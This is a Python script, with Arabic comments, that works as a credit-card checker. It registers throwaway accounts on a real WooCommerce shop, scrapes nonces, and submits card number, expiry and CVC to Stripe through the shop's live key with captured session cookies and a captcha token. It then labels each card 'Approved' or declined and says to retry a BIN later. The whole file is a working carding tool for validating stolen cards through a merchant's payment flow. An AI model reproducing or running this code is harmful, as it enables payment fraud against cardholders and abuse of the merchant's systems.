import requests
import re
import time
import random
import json
import string
import base64
import os


def Stripe1(ccx):
	ccx = ccx.strip()
	n, mm, yy, cvc = ccx.split("|")

	if "20" in yy:
		yy = yy.split("20")[1]

	user = "Mozilla/5.0 (Linux; Android 10; Mobile)"

	r = requests.session()

	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		return f"{name}{number}@yahoo.com"

	acc = generate_random_account()
	
	headers = {
	    'authority': 'calefs.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'referer': 'https://calefs.com/my-account/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://calefs.com/my-account/', cookies=r.cookies, headers=headers)

	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
				
	
	headers = {
	    'authority': 'calefs.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://calefs.com',
	    'referer': 'https://calefs.com/my-account/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	data = {
	    'username': acc,
	    'password': acc,
	    'woocommerce-login-nonce': register,
	    '_wp_http_referer': '/my-account/',
	    'login': 'Log in',
	}
	
	response = r.post('https://calefs.com/my-account/', cookies=r.cookies, headers=headers, data=data)
	
	
	headers = {
	    'authority': 'calefs.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	
	    'referer': 'https://calefs.com/my-account/payment-methods/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://calefs.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	# ========== بداية التعديل ==========
	# <--- التعديل هنا: بنبحث عن أول nonce في الصفحة بدل ما ندور على اسم محدد
	nonce_list = re.findall(r'nonce[":=]+([a-zA-Z0-9]+)', response.text.lower())
	if nonce_list:
		nonce = nonce_list[0]
		print(f"    - ✅ تم العثور على nonce: {nonce[:10]}...") # رسالة تأكيد في التيرمينال
	else:
		print("    - ❌ لم يتم العثور على أي nonce!")
		return "Error: No nonce found for adding card"
	# ========== نهاية التعديل ==========
	
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10090&billing_details[address][country]=US&payment_user_agent=stripe.js%2F87c929d960%3B+stripe-js-v3%2F87c929d960%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fcalefs.com&time_on_page=117747&client_attribution_metadata[client_session_id]=5fc7e9e5-7291-43ee-92c9-2103b18579c0&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1E8JdfRCNnB&client_attribution_metadata[elements_session_config_id]=a183b6e3-eb1a-473d-a2ec-38216a2891fe&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=f5232553-ffae-4822-a220-d7aafbdd726454740e&muid=77fe5d86-5049-4fd3-823e-4b6a0b85f886fdbd2a&sid=c5d37837-b440-4f6c-8ce5-ec88e4fea03e924011&key=pk_live_51HfDUNJxMpnGQw1aHtp5zNZRRUyyL3KS5BuswKBVOYyy3o4X5wo8Ialp7c7VMCp17TCzGEs5U76LspvnGZeXwktX00jx8JG3Ik&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzczNDMwMjkwLCJjZGF0YSI6IkVXeG9ON0lOZU9jNG00dnhIUzg4OWsvbENJMExDMXBVTjd5THl4VXNpY0QrSTRGTGtaSm1RaUEvNVUyTUhUczBvRlRKZzYzelpSaTBlTHBRMG1vM3g3dEt6NVJ2QXhDRW9wOHFtUXpjWjFGQlB0RW1iTE5OcmZ1eG9WRkN6OU1PLzRNdDJpM0lYUmJrOXVpRXRvYjFHWG44YS8yYlJoVFFaR3gzeHRJaWNnSmVCcWdXdFJXRXVPSEk3NSszM1B5bGt0R2k4K01Wb0RlcnVMWDBVdDlrUDlNN3NmMzF4a3BtSmZqbldmclEraGRyb3FYRXZ6T0laOHYvYXQ3WC9MSXdUTTdWdGtKd2FOT2tiODV0a3pEbXJXWjlWUjhJcW5mdS9kNVBLako1WTl0TnlBMTFOSndxcDdtSFhXZVBLMW5WK3ZzaHAwWVRaSmJSYTA1WVBIa2ZzK1Brd3FWekZ1OUhJZlhZdnlpbWRJYz1rRWgzSng1ZUdpTFo2K0daIiwicGFzc2tleSI6IkExcWdFL1RCRFQwenEvSk4xZ0RJaVlseE45QlczTkZpcEd6eWJmbXFxSEUwMW1nZWpjaG14eG9oMXU4RGFLZDdNZnNJbmcvSkhIOUlYLzdrbVI4dEFHZGd0bkJrWGZ1QUtvV3MvWnJRVDRUTzBFT3JaUXFWOUlqeEVPMGRCVEI4MitnVUplTnN5VnFOVm8vRWRGS3FCdmV6Ui9sbHBZamZOTGpBYzhQWWx2aUoyL3VsRWRIampCOXF1WCtMWDB3c1N2OHB5cHNlLzlSS1o1cmpEQUp2OUVzSUt0RGQzRFAxSUY5dlV5TlJoRUNpa2V1R3BnWExKRE02MGk1UXpHRnhRb29obXBSRHlYeGVUQ2RESHgreVU4akxqc2ZVSnpieWJSR3RHNkNXc0R3Y05zbHFtc3RCQXhzb3VnTDI0aVhyQnQ5cFQyNWs4QkRueC9MdWhuTmFDSVZ5cm1scjNLalRmVXhEd2ZZQzJzenBEdXVOMmRiRDBtbis5VWVUcnJIZy9lMUYxdmlZNklLdkJkbG1yZUE4Si9XdVhPd083SU5IcithZkNMZnphV1ZoWmtVVXlwak15RjJqamdCUzYrSzRHWDlwM2daYnlzYS9TQ0hGY01YbnNmczRsNE9zYlYrcUU0RHMxMldlbFFFSU0rM3Y3ZlV1N3ErR3c1Qk9yK1JBenJTNUVrNjFlc0dsRDd6dVo0MjZRbzNiMWpzeEJIbW9rNTg2NU5GQU9GdlBSZEtZWGI5UUxOR2dRajBoVHpBZ3BUZUdiWTZKYTBpeFY2YVZFUnRKdXZmLzV5SmM5V3dvS0MxakdiMi9RSVVoM2drd3FxWktwOWYxMmxyM2FIcUF1WDJ3SUtySEQ1d3hoQWpsQVhrZm9yZkhqajJLL2o4MkdKWEJ2VnpndzJjSnJrcWpKWUpaSXIwcU8xVUo2WGNZR3h5aWMvaTd5UWJ3VG9PWDVWZHE5dEsreHNaQno0UFFNc0EydkRPNko0RGx5aUJ0MXNBOWtNK3VrTHJBSGhQMG1Hb2RIeW1qNzJsR25DRVpRZXA1cFpCdzYvdWZydFQ1bXJDY3VzUVYyZUU3cFN2NG5LaU9lUEVlN0VqdnlMMVc4SGNKS2psUFBOUkhBT002K1ZzV1lhb0Q3Ni9JbEtBcVcvS0VPUmhNOHJqTTlzK0RuajFCeit4QXdKQndtTzJWc2sxWlpqKys2dHovbnd4dzd3am1HWXVXcFN4ZDRmSEQ5ZjdUK2cvV252OFNlbVVsTFg1WE1YcnEwbVZxaEtLQ3ZNTCsxZ082WkpUU3NEUWdKNXN1TklXOHFOVTNhWkp0NFIzSGh2THloZU9EVG1icDM2eG5DVGxQMHFrdHNCOTZ3TGJqQ3IwMTdTcDlDcHliYlBoV2xWMkFxZU9oUFZ1eGtVQ1lVd3NSc3ljZVU5YWJKZ1gwNXg3QkIzMFlMUU42WFNVdkkwVlJPS2VvbGp0ZW14YllmaXpsUFJJUDZQM3FvaFd1bUtYQVBpc2pkL28wMmZhbDB5SDhxZzRwSUFTT1dZSkdlN0JLUHFZdkdSbWpHYXVzeGU0bTVOcjQ2enpIY3pPN1UxT0JLMTlBdjk2Mms1VmE4a1h2dUFnSjFwb0djUEhJelJ0b0NUeDhmZEUzMG5TNjI3c2FjNG0rRmZralZDSEZGbkFza1lVSm45Z3ZzdFRYK1JHSXJuWE9UZ2N4bm1JWGRwZG4xTTM0L3FNMVpUU3NzUm4ya2tuNlpTTFFnaUNTTDMxNlhmR2J2SmlKZWwvaFVORzJQcFp6Y3JMT0ZDTW9HOVNlQWhUbDc1WStKMHBuaE80OWN2aGNsV0lhaUFKcFNxZ1IzVE85VVhOK0Y3WE1FaUQ4bnNIVFBIWEJoclNDRUJMdkxoUUpuTXRlODc0ZHBaT2ZZVjF5MytUaHo2bFB3OTZyODNLQXVVcWhLSWdieHdvTnBxOUV5Y1lHWUtTekZUNCtpZWgxR1pEeEpTMzdpaGV6NTZ5SGI4TW1ZbDNvblNrcEpKUTI0b25tSDMzQW5yelh6eU14eGpsZUhqUFd5UW91dnEyNzRjUm1MK1BZS1BUcUVONG80SHJiZHNSNTVLYTVQT21HUXQ4cUtEZ1JJUHRYSE9od2FCdXdsTllZTDBuTHBsKytUV2Q0d09ZdlBDMGJWbmdSVXVOQjJWUkhvS0NxRDVMSys5MVcrOGxPNFFRTnRoRUNFMHlUZnpvdUNCZDNjbXV6NVVDQUdKZlNVdEFKTXR0Vi9xbWtJUTlUSVJDNEowQml6ck4vbHVIRmFQQkRpMElEamZ0NlJmeU1kQU9HYitJUXZ0aGdnbW95TTN0bTBWYWhveDZuWFkwbVNWVTNNQWVEYTJLcEtNaWpOanNOcXczb3k0T1RmYm5NQjdlT2I5MmpKK2RWdk8vVUd6dXlORDNkUWxUQlpLVjlkWCtEU2luSGp2Y3lNSmtGQitIZWdVOXBJOXpaSGVvZ0gwQkoxRjgrcEhOMTZySU9taTNWN0loTzhnZlIrMEt1bVZTVXYxOEhOZjFPOWIrNzcyM3pkSzdRVFhrbGQwNXBBUlkySVFzNGpnc1c4bG5CZys3RUJDcklVbGRKeDBWdFVaWHpaVG1ZUGR4OXMwOEVwQTNhd294YXlHTjFsWmdSRXk4N211V01SdFE5MVhXaUYxYktEV3QveHp1Rnh6K2RQU3JGWmRQR3o0d1BnWVN2TGc4L2UvSHFQZXBiYXpmWUEyNS85c1Vaa2xzUWZ6cjBaYnI0ZlptOEk0MlJTdGFlVjBYaC83QlNCWnc9Iiwia3IiOiI3ODc1YjNiIiwic2hhcmRfaWQiOjUzNTc2NTU5fQ.urcJB3xiboBZS0oDLgDYbmvGZmBsygzUcl2tKfaaAfw'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	if not 'id' in response.json():
		print('ERORR CARD')
		return "Error: Could not create payment method"
	else:
		id=response.json()['id']
	
	cookies = {
	    'wordpress_sec_9c73aa6552c88cc6726a8128d8578eee': 'sbhyjamryky%7C1773602686%7ClnqjUGhRjKNUOvMJdoh9prG6fOplLW7tdOe9l6Lfutu%7Ca748b1d840572fbd3011afc460a064a99b968efcca74eeaea59e0d566a615747',
	    '_gid': 'GA1.2.592023312.1773429389',
	    '_clck': 'ihiwmh%5E2%5Eg4b%5E0%5E2263',
	    'WR_UNQ_VID': '94fbd536-54b9-79f4-0e1b-a1d1de758e29',
	    '__stripe_mid': '77fe5d86-5049-4fd3-823e-4b6a0b85f886fdbd2a',
	    '__stripe_sid': 'c5d37837-b440-4f6c-8ce5-ec88e4fea03e924011',
	    'datadome': 'md4~bMhMCjHHo7SLH9yXx~Rx0hnrUKgD5xogmVoV4Qej2Tl9aQcKR8B79N3uPfnIqjKJ8IPrXDdnBBXJXNtzAKY5781KP8Sy6ib7ohdA5E1S2xIRtuWPR4jV6p2dIB6J',
	    'wfwaf-authcookie-e22ba43a4342acaf8c5e8ca71f0a568a': '428311%7Cother%7Cread%7C45e89b666c061b12575ede6b3f461153a114ec2c250e09f0b031a5616e044c6e',
	    '__kla_id': 'eyJjaWQiOiJNek0xTmpFd01XSXRPRGsxTlMwME5qUmlMVGd4T1RVdE56TTNZamd4WW1NMllXVmkiLCIkZXhjaGFuZ2VfaWQiOiJubm5scFNzclc2QjA0a085ZnoxYzNVaFI2Z1FmR1lvVDZ6STlhWHUwY0hjLlhZZ25RSyJ9',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2026-03-13%2019%3A24%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Fcalefs.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fcalefs.com%2Fmy-account%2F%3Fpassword-reset%3Dtrue',
	    'sbjs_first_add': 'fd%3D2026-03-13%2019%3A24%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Fcalefs.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fcalefs.com%2Fmy-account%2F%3Fpassword-reset%3Dtrue',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
	    '_gcl_au': '1.1.1264134801.1773429387.1063447086.1773429392.1773429884',
	    'wordpress_logged_in_9c73aa6552c88cc6726a8128d8578eee': 'sbhyjamryky%7C1773602686%7ClnqjUGhRjKNUOvMJdoh9prG6fOplLW7tdOe9l6Lfutu%7C36be1860be2485f38d0049d3fdc7531baad2e215b228582a6176d7fe813ae789',
	    'sbjs_session': 'pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcalefs.com%2Fmy-account%2Fadd-payment-method%2F',
	    '_ga_THSXCY5G91': 'GS2.1.s1773429388$o1$g1$t1773430091$j48$l0$h0',
	    '_ga': 'GA1.1.1560658993.1773429388',
	}
	
	headers = {
	    'authority': 'calefs.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://calefs.com',
	    'referer': 'https://calefs.com/my-account/add-payment-method/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	}
	
	data = {
	    'action': 'wc_stripe_create_and_confirm_setup_intent',
	    'wc-stripe-payment-method': id,
	    'wc-stripe-payment-type': 'card',
	    '_ajax_nonce': nonce,
	}
	
	response = r.post('https://calefs.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'success' in text:
			result = "success"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "declined"
	if 'avs' in result or 'success' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result
